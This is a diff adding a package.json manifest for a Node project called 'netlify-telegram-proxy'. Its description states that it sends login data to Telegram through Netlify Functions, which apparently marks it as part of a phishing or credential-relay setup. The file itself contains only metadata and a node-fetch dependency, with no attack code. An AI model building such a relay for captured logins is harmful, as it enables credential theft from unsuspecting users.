@@ -1,0 +1,12 @@
+{
+  "name": "netlify-telegram-proxy",
+  "version": "1.0.0",
+  "description": "Proxy to send login data to Telegram using Netlify Functions.",
+  "main": "index.html",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "node-fetch": "^2.6.1"
+  }
+}
